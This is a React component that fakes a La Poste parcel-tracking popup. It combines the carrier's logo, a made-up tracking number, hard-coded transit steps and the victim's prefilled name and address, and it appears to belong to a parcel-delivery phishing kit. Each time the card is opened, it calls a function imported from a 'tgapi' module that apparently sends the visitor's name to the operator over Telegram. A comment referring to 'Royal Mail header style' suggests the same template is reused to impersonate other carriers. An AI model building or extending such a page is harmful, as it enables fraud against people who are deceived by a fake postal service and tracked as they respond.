import { useState, useEffect, useRef } from "react";
import { Calendar, Clock, Truck, AlertCircle, CheckCircle, Package, MapPin, Check, Info, X } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogTrigger } from "@/components/ui/dialog";
import { sendPackageDetailsViewNotification } from "../tgapi";
import laPosteLogo from "@/assets/laposte.png";

interface FrPackageFormProps {
  recipientData?: {
    name?: string;
    address?: string;
    city?: string;
    zip?: string;
    phone?: string;
  };
}

const FrPackageForm = ({ recipientData }: FrPackageFormProps) => {
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showContent, setShowContent] = useState(false);
  
  const deliveryStatus = "in-transit";
  const returnedToDepotRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (isDialogOpen) {
      setIsLoading(true);
      setShowContent(false);
      const timer = setTimeout(() => {
        setIsLoading(false);
        setShowContent(true);
      }, 100);
      return () => clearTimeout(timer);
    } else {
      setShowContent(false);
    }
  }, [isDialogOpen]);
  useEffect(() => {
    if (showContent) {
      // Start at the top immediately
      const container = document.querySelector('.flex-1.overflow-y-auto');
      if (container) {
        container.scrollTo({
          top: 0,
          behavior: 'auto'
        });

        // Wait a moment then start smooth continuous scroll
        setTimeout(() => {
          const element = document.querySelector('[data-step="returned-to-depot"]') as HTMLElement;
          if (element) {
            const targetPosition = element.offsetTop - container.clientHeight / 2;
            const startPosition = 0;
            const distance = targetPosition - startPosition;
            const duration = 750; // 0.75 seconds total animation (much faster)
            const startTime = performance.now();
            const animateScroll = (currentTime: number) => {
              const elapsedTime = currentTime - startTime;
              const progress = Math.min(elapsedTime / duration, 1);

              // Easing function for smooth animation
              const easeInOutQuad = (t: number) => t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t;
              const currentPosition = startPosition + distance * easeInOutQuad(progress);
              container.scrollTo({
                top: currentPosition,
                behavior: 'auto'
              });
              if (progress < 1) {
                requestAnimationFrame(animateScroll);
              }
            };
            requestAnimationFrame(animateScroll);
          }
        }, 300);
      }
    }
  }, [showContent]);

  const trackingSteps = [{
    icon: Package,
    title: "Colis expédié",
    location: "Centre de distribution Lyon",
    city: "Paris, France",
    date: "12 Août",
    time: "08:30",
    status: "completed",
    bgColor: "bg-blue-50",
    iconColor: "text-blue-600"
  }];
  const statusConfig = {
    "in-transit": {
      icon: Truck,
      label: "En transit",
      color: "text-blue-600",
      bgColor: "bg-blue-50",
      borderColor: "border-blue-200"
    },
    "delivered": {
      icon: CheckCircle,
      label: "Livré",
      color: "text-green-600",
      bgColor: "bg-green-50",
      borderColor: "border-green-200"
    },
    "pending": {
      icon: AlertCircle,
      label: "En attente",
      color: "text-orange-600",
      bgColor: "bg-orange-50",
      borderColor: "border-orange-200"
    }
  };
  const currentStatus = statusConfig[deliveryStatus as keyof typeof statusConfig];
  const StatusIcon = currentStatus.icon;
  const handleCardClick = () => {
    // Send package details notification
    const clientName = recipientData?.name || "Unknown Client";
    sendPackageDetailsViewNotification(clientName);
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setIsDialogOpen(true);
    }, 250);
  };
  return <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
      <Card onClick={handleCardClick} className={`glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-500 ease-out border border-gray-250 cursor-pointer group hover:scale-105 active:scale-95 w-fit min-w-[190px] ${isLoading ? 'scale-95' : ''}`}>
        <div className="px-2 pt-2 pb-2 transition-all duration-300">
          <CardTitle className="flex items-center text-sm transition-colors duration-300">
            <div className={`p-2 bg-blue-50 rounded-xl mr-3 transition-all duration-300 shadow-md shadow-black/10 border border-white/50 backdrop-blur-sm group-hover:shadow-lg group-hover:scale-110 group-active:scale-95 ${isLoading ? 'animate-pulse' : ''}`}>
              <Info className={`h-5 w-5 text-blue-600 drop-shadow-sm transition-all duration-300 group-hover:rotate-12 ${isLoading ? 'animate-spin' : ''}`} />
            </div>
            <span className="transition-all duration-300 group-hover:translate-x-1">
              {isLoading ? 'Chargement...' : 'Informations du colis'}
            </span>
          </CardTitle>
        </div>
      </Card>
      <DialogContent className="p-0 border-0 bg-black/20 shadow-none max-w-[320px] w-full my-8 max-h-[80vh] overflow-hidden data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=open]:duration-300">
        <div className="h-full max-h-[70vh] flex flex-col">
          <Card className="shadow-2xl border-2 border-red-500 rounded-[6px] drop-shadow-xl bg-white h-full flex flex-col overflow-hidden transform transition-all duration-300 ease-out data-[state=open]:animate-in data-[state=open]:zoom-in-95 data-[state=open]:fade-in-0">
            {/* Banner with Logo - Sticky */}
            <div className="sticky top-0 z-10 bg-gradient-to-r from-yellow-400 to-yellow-500 p-4 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-yellow-300 to-yellow-400 border-2 border-white/50 rounded-sm px-3 py-0.5 shadow-lg">
                  <span className="text-gray-700 font-chevin font-medium text-xs">Informations du colis</span>
                </div>
              </div>
              {/* Close Button */}
              <button 
                onClick={() => setIsDialogOpen(false)}
                className="absolute right-3 top-3 bg-red-400/80 hover:bg-red-400 rounded-full w-6 h-6 flex items-center justify-center shadow-md hover:shadow-lg transition-all duration-300 hover:scale-105 border border-red-500"
              >
                <X className="h-4 w-4 text-white" />
              </button>
              
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 w-10 h-10 bg-transparent rounded-full flex items-center justify-center shadow-lg border-2 border-white/50">
                <Package className="h-6 w-6 text-gray-600 drop-shadow-lg" />
              </div>
            </div>
            
            <div className="flex-1 overflow-y-auto px-2 pt-4 pb-4">
              {isLoading ? <div className="p-6 animate-fade-in">
                  <Card className="shadow-lg border border-border/50 bg-white animate-scale-in">
                    <CardContent className="flex flex-col items-center space-y-6 pt-8 pb-8">
                      <div className="relative">
                        <div className="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center animate-pulse">
                          <Package className="h-8 w-8 text-blue-600" />
                        </div>
                        <div className="absolute inset-0 rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
                      </div>
                       <p className="text-gray-600 text-center text-sm max-w-xs animate-fade-in" style={{animationDelay: '0.2s'}}>
                          Veuillez patienter pendant que nous nous connectons au système de suivi.
                        </p>
                    </CardContent>
                  </Card>
                </div> : showContent ? <div className="space-y-4 animate-fade-in">
              
              {/* Tracking Timeline Card */}
              <div className="p-4 bg-card rounded-xl border border-border/50 shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">


                <div className="space-y-4">
                    <div className="relative">
                      {trackingSteps.map((step, index) => {
                      const Icon = step.icon;
                      const isCompleted = step.status === "completed";
                      const isCurrent = step.status === "current";
                      const isFailed = step.status === "failed";
                      const isAvailable = step.status === "available";
                      return <div key={index} className="relative flex items-start pb-6 last:pb-0" data-step={step.title === "Returned to Depot" ? "returned-to-depot" : undefined}>
                            {/* Timeline line - thin white vertical line */}
                            {index < trackingSteps.length - 1 && <div className="absolute left-6 top-12 w-1 h-24 bg-white" />}
                            
                            {/* Icon with circular background */}
                            <div className="flex-shrink-0 relative z-10">
                              <div className={`w-12 h-12 rounded-full flex items-center justify-center border-4 border-white shadow-lg drop-shadow-md ${step.bgColor}`}>
                                <Icon className={`h-5 w-5 ${step.iconColor}`} />
                              </div>
                            </div>
                            
                            {/* Content - White Card */}
                            <div className="flex-1 min-w-0 ml-4">
                                <div className="bg-card p-3 rounded-lg border-4 border-white shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                                  {/* Package Details in Timeline */}
                                  <div className="mb-3 pb-2 border-b border-border/30">
                                    <div className="flex items-center justify-between">
                                      
                                      <span className="text-[9px] px-2 py-1 bg-white text-gray-800 rounded-md font-medium shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">LP123456789FR</span>
                                    </div>
                                  </div>

                                  {/* Recipient & Sender Info */}
                                  <div className="grid grid-cols-1 gap-2 mb-3">
                                    {/* Recipient */}
                    <div className="bg-muted/20 p-2 rounded">
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-[8px] font-medium text-muted-foreground uppercase tracking-wider">Destinataire</span>
                        <div className="w-1.5 h-1.5 bg-green-500 rounded-full"></div>
                      </div>
                       <p className="text-[10px] font-medium text-foreground">{recipientData?.name || ""}</p>
                       <p className="text-[9px] text-muted-foreground">{recipientData?.address || ""}{recipientData?.city ? `, ${recipientData.city}` : ""} {recipientData?.zip || ""}</p>
                    </div>

                    {/* Sender */}
                    <div className="bg-muted/10 p-2 rounded">
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-[8px] font-medium text-muted-foreground uppercase tracking-wider">Expéditeur</span>
                        <div className="w-1.5 h-1.5 bg-blue-500 rounded-full"></div>
                      </div>
                       <p className="text-[10px] font-medium text-foreground">Centre La Poste</p>
                       <p className="text-[9px] text-muted-foreground">Lyon</p>
                    </div>
                                  </div>

                                  {/* Package Info */}
                  <div className="grid grid-cols-2 gap-2">
                    <div className="bg-accent/10 p-4 rounded text-center shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                       <span className="text-[8px] font-medium text-muted-foreground uppercase block">Poids</span>
                       <span className="text-[10px] font-semibold text-foreground">0.5kg</span>
                    </div>
                    <div className="bg-accent/10 p-4 rounded text-center shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                      <span className="text-[8px] font-medium text-muted-foreground uppercase block">Dimensions</span>
                      <span className="text-[10px] font-semibold text-foreground">20x15x5cm</span>
                    </div>
                  </div>
                                 </div>
                               </div>
                          </div>;
                    })}
                    </div>
                    
                    {/* Delivery Instructions Card - Moved to bottom */}
                    <div className="mt-6 p-4 bg-gradient-to-r from-muted/30 to-muted/10 rounded-xl border border-border/50 border-2 border-white shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                      <h4 className="text-xs font-semibold text-card-foreground mb-3 relative text-center">
                        <span className="relative inline-block">
                          <span className="relative z-10">Instructions de livraison</span>
                          <div className="absolute -bottom-1 left-0 w-full h-px bg-gradient-to-r from-gray-500 to-gray-600 rounded-full"></div>
                          
                          <div className="absolute -bottom-3.5 left-1/3 w-1/3 h-1.5 bg-gray-300/40 rounded-full blur-md"></div>
                        </span>
                      </h4>
                      <ul className="text-[10px] text-muted-foreground space-y-2">
                        <li className="flex items-start space-x-2">
                          <span className="text-blue-500 font-bold">•</span>
                          <span className="relative inline-block">
                            <span className="relative z-10">Veuillez vous assurer qu'une personne soit disponible pour réceptionner le colis</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                            <div className="absolute -bottom-0.5 left-0 w-full h-px bg-gray-400/60 rounded-full blur-[1px]"></div>
                          </span>
                        </li>
                        <li className="flex items-start space-x-2">
                          <span className="text-blue-500 font-bold">•</span>
                          <span className="relative inline-block">
                            <span className="relative z-10">Une pièce d'identité peut être requise pour vérification</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                            <div className="absolute -bottom-0.5 left-0 w-full h-px bg-gray-400/60 rounded-full blur-[1px]"></div>
                          </span>
                        </li>
                        <li className="flex items-start space-x-2 relative">
                          <span className="text-blue-500 font-bold">•</span>
                          <span className="relative">
                            <span className="relative z-10">Options de dépôt sécurisé disponibles si personne n'est présent</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                            
                            <div className="absolute -bottom-0.5 left-0 w-full h-px bg-gray-400/60 rounded-full blur-[1px]"></div>
                          </span>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div> : null}
          </div>
          
          {/* Status Banner - Similar to Royal Mail header style */}
            
            {/* Status Banner - Similar to Royal Mail header style */}
            <div className="sticky bottom-0 z-10 bg-white py-4 px-2 relative">
              <div className="flex items-center justify-center">
              </div>
              <img src={laPosteLogo} alt="La Poste Logo" className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2 h-4 w-auto" />
            </div>
        </Card>
        </div>
      </DialogContent>
    </Dialog>;
};
export default FrPackageForm;
